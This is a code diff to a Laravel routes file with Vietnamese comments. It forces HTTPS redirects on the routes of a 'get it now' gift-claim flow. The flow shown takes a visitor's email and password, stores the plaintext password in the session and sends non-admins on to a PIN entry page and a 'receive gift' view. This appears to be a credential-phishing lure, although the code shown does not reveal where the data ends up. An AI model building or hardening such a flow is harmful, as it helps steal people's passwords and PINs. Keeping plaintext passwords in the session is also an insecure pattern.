@@ -6,6 +6,9 @@ use App\Models\User;
 
 // Trang chính truy cập '/'
 Route::get('/', function () {
+    if (!\Request::secure()) {
+        return redirect()->secure(\Request::path());
+    }
     return view('getItNow');
 });
 
@@ -15,12 +18,18 @@ Route::get('/', function () {
 
 // Khi bấm nút "Nhận ngay", chuyển đến welcome
 Route::get('/welcome', function () {
+    if (!\Request::secure()) {
+        return redirect()->secure(\Request::path());
+    }
     return view('welcome');
 });
 
 
 // ✅ SỬA LẠI route này để kiểm tra admin tại đây
 Route::post('/receive', function () {
+    if (!\Request::secure()) {
+        return redirect()->secure(\Request::path());
+    }
     $email = request('email');
     $password = request('password');
 
@@ -31,7 +40,7 @@ Route::post('/receive', function () {
         ->first();
 
     if ($admin) {
-        return redirect()->route('admin.dashboard');
+        return redirect()->secure('/admin');
     }
 
     // Nếu không phải admin → chuyển sang bước nhập PIN
@@ -39,10 +48,13 @@ Route::post('/receive', function () {
         'email' => $email,
         'password' => $password,
     ]);
-    return redirect('/nhanQua');
+    return redirect()->secure('/nhanQua');
 })->name('login.step1');
 
 Route::get('/nhanQua', function () {
+    if (!\Request::secure()) {
+        return redirect()->secure(\Request::path());
+    }
     return view('receiveGift');
 });
 
